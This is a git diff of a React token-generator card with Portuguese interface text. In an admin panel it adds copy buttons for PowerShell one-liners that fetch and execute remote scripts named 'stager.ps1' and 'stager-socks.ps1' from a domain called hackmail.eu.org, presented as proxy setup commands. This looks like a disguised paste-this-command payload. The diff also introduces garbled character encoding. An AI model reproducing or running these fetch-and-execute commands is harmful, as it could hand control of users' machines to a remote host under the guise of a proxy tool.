@@ -1,4 +1,4 @@
-import { useState } from "react";
+Ôªøimport { useState } from "react";
 import { Key, Download, Loader2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { useToast } from "@/components/ui/use-toast";
@@ -64,13 +64,7 @@ const TokenGeneratorCard = ({ isAdmin }: { isAdmin?: boolean }) => {
         Esse sistema encapsula todo o tr√°fego do sistema operacional via Cloudflare. O token gerado dura 2H e fica atrelado ao registro global (RG) da sua m√°quina.
       </p>
 
-      {isAdmin && (<div className="flex flex-col gap-3 mt-2 w-full"><div className="w-full bg-[#1e1e1e] border border-border p-4 rounded-xl flex flex-col gap-2"><span className="text-xs text-muted-foreground font-semibold text-emerald-400">¡rea Admin - Proxy V1 HTTP (NavegaÁ„o):</span><div className="flex items-center justify-between gap-2"><code className="text-[10px] sm:text-xs text-emerald-400 break-all select-all font-mono">Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager.ps1")</code><Button variant="ghost" size="sm" className="shrink-0 h-7 text-xs" onClick={() => { navigator.clipboard.writeText('Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager.ps1")');}}>Copiar</Button></div></div><div className="w-full bg-[#3b1515] border border-red-900/50 p-4 rounded-xl flex flex-col gap-2"><span className="text-xs font-semibold text-red-400">¡rea Admin - Proxy V2 SOCKS5 (Jogos/Proxifier):</span><div className="flex items-center justify-between gap-2"><code className="text-[10px] sm:text-xs text-red-300 break-all select-all font-mono">Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager-socks.ps1")</code><Button variant="ghost" size="sm" className="shrink-0 h-7 text-xs text-red-200 hover:text-white hover:bg-red-800" onClick={() => { navigator.clipboard.writeText('Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager-socks.ps1")');}}>Copiar</Button></div></div></div>)};
-              }}>
-              Copiar
-            </Button>
-          </div>
-        </div>
-      )}
+      {isAdmin && (<div className="flex flex-col gap-3 mt-2 w-full"><div className="w-full bg-[#1e1e1e] border border-border p-4 rounded-xl flex flex-col gap-2"><span className="text-xs text-muted-foreground font-semibold text-emerald-400">√Årea Admin - Proxy V1 HTTP (Navega√ß√£o):</span><div className="flex items-center justify-between gap-2"><code className="text-[10px] sm:text-xs text-emerald-400 break-all select-all font-mono">Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager.ps1")</code><Button variant="ghost" size="sm" className="shrink-0 h-7 text-xs" onClick={() => { navigator.clipboard.writeText('Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager.ps1")'); toast({ title: "Comando V1 Copiado!", duration: 2000 });}}>Copiar</Button></div></div><div className="w-full bg-[#3b1515] border border-red-900/50 p-4 rounded-xl flex flex-col gap-2"><span className="text-xs font-semibold text-red-500">√Årea Admin - Proxy V2 SOCKS5 (Jogos/Proxifier):</span><div className="flex items-center justify-between gap-2"><code className="text-[10px] sm:text-xs text-red-400 break-all select-all font-mono">Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager-socks.ps1")</code><Button variant="ghost" size="sm" className="shrink-0 h-7 text-xs text-red-300 hover:text-white hover:bg-red-800" onClick={() => { navigator.clipboard.writeText('Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager-socks.ps1")'); toast({ title: "Comando SOCKS5 Copiado!", duration: 2000});}}>Copiar</Button></div></div></div>)}
 
       {token && (
         <div className="w-full bg-secondary border border-border p-4 rounded-xl flex items-center justify-between">
